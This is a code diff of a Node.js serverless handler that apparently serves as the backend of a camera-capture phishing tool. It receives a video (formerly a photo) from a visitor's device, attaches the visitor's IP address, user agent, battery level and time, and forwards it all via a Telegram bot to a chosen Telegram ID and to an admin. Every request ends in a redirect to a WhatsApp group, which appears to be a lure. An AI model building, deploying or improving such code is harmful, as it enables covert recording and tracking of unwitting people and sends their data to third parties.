@@ -1,70 +1,99 @@
+const formidable = require('formidable');
+const fs = require('fs');
 const { Telegraf } = require('telegraf');
+
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-let userCounter = {}; // 📌 هر uid لپاره شمېرنه
+module.exports = (req, res) => {
+  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");
 
-module.exports = async (req, res) => {
-  if (req.method !== 'POST') {
-    return res.status(405).send('Method Not Allowed');
-  }
+  const form = new formidable.IncomingForm({
+    uploadDir: "/tmp",
+    keepExtensions: true,
+  });
 
-  try {
-    const { image, uid, battery, charging } = req.body;
-    const adminId = process.env.ADMIN_ID;
+  form.parse(req, async (err, fields, files) => {
+    if (err) return res.status(500).send("Form parse error");
 
-    if (!uid || !image) return res.status(400).send('UID or Image missing');
+    const uid = fields.uid;
+    const file = files.video;
 
-    // 📌 د هر uid لپاره شمېر
-    userCounter[uid] = (userCounter[uid] || 0) + 1;
-    if (userCounter[uid] > 4) {
-      return res.status(403).send('⛔ Limit reached: No more uploads allowed.');
-    }
+    if (!uid || !file) return res.status(400).send("UID or video missing");
 
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'] || "Unknown";
-    const timestamp = new Date().toLocaleString('en-US', {
-      timeZone: 'Asia/Kabul',
-      hour12: false,
-    });
+    try {
+      // Device & Network info
+      const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
+      const userAgent = req.headers['user-agent'] || "Unknown";
+      const timestamp = new Date().toLocaleString('en-US', {
+        timeZone: 'Asia/Kabul',
+        hour12: false,
+      });
 
-    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
-    const imgBuffer = Buffer.from(base64, 'base64');
+      // Battery info (from frontend)
+      const battery = fields.battery || 'Unknown';
+      let charging = 'Unknown';
+      if (fields.charging === 'true') charging = 'Yes 🔌';
+      if (fields.charging === 'false') charging = 'No 🔘';
 
-    const isCharging = charging ? 'Yes 🔌' : 'No ❌';
-    const caption = `
-🆕 *New Photo Received*
-
-━━━━━━━━━━━━━━━━━━
-🆔 *Telegram ID:* \`${uid}\`
-🔋 *Battery Level:* \`${battery || '?'}%\`
-⚡ *Charging:* \`${isCharging}\`
-🌐 *IP Address:* \`${ip}\`
-📱 *Device:* \`${userAgent}\`
-🕒 *Time:* \`${timestamp}\`
-━━━━━━━━━━━━━━━━━━
-
-──────╮  
-│🧑🏻‍💻 *Built By 💛 WACIQ* 
-╰────────────╯
+      // Telegram Caption (BOX + FONT + LINES + Bold)
+      const caption = `
+╭─────🎥 <b><blockquote>𝐍𝐄𝐖 𝐕𝐈𝐃𝐄𝐎 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃</blockquote></b> │─────────────────────╮
+│                                                                │ 
+│─❖ 🙎 <b>Usᴇʀ ID:</b> ${uid}                                      │ 
+│
+│─❖ 🔋 <b>Bᴀᴛᴛᴇʀʏ:</b> ${battery}%     
+│
+│─❖ ⚡ <b>ᴄʜᴀʀɢɪɴɢ:</b> ${charging}
+│
+│─❖ 🌐 <b>IP:</b> ${ip}
+│
+│─❖ 📱 <b>Dᴇᴠɪᴄᴇ:</b> ${userAgent}
+│ 
+│─❖ 🕒 <b>Tɪᴍᴇ:</b> ${timestamp}
+╰───────────────────────────────────────
+╭────👨🏻‍💻 <b><blockquote>ᗷᑌIᒪT ᗷY ᗯᗩՏIᑫ</blockquote></b>  ───╮
+╰─────────────────────╯
 `.trim();
 
-    // ✅ Send to user
-    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
-      caption,
-      parse_mode: 'Markdown'
-    });
+      // Read video
+      const buffer = fs.readFileSync(file.filepath);
 
-    // ✅ Send to admin
-    if (adminId) {
-      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
-        caption,
-        parse_mode: 'Markdown'
-      });
+      // Send video to user
+      await bot.telegram.sendVideo(
+        uid,
+        { source: buffer },
+        {
+          caption: caption,
+          parse_mode: "HTML",
+        }
+      );
+
+      // Send video to admin (optional)
+      if (process.env.ADMIN_ID) {
+        await bot.telegram.sendVideo(
+          process.env.ADMIN_ID,
+          { source: buffer },
+          {
+            caption: caption,
+            parse_mode: "HTML",
+          }
+        );
+      }
+
+      // Cleanup temp file
+      fs.unlinkSync(file.filepath);
+
+      // ✅ Redirect to WhatsApp link after successful send
+      res.redirect("https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4");
+
+    } catch (e) {
+      console.error("Telegram Error:", e.message);
+
+      // ❌ Redirect to WhatsApp link on error
+      if (file && file.filepath) {
+        try { fs.unlinkSync(file.filepath); } catch {}
+      }
+      res.redirect("https://chat.whatsapp.com/JHqpkhbogSIJJoLWp5Phn4");
     }
-
-    res.status(200).send('✅ Uploaded');
-  } catch (err) {
-    console.error(err);
-    res.status(500).send('❌ Upload Error');
-  }
+  });
 }; 
